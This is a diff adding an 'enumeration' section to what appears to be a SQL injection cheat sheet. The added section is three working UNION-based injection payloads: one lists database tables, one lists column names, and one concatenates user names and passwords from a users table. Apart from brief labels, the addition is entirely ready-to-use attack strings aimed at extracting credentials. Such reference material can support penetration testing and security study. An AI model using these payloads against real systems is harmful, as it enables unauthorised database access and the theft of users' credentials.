@@ -85,3 +85,17 @@
 
 -----
 
+
+#### enumeration
+
+*extract list of tables*
+
+```1' UNION SELECT 1,table_name FROM information_schema.tables;- -```
+
+*extract column names*
+
+```1' UNION SELECT 1,column_name FROM information_schema.columns;- -```
+
+*concat and extract data*
+
+```1' UNION SELECT 1,concat(user,':',password) FROM users;- -```
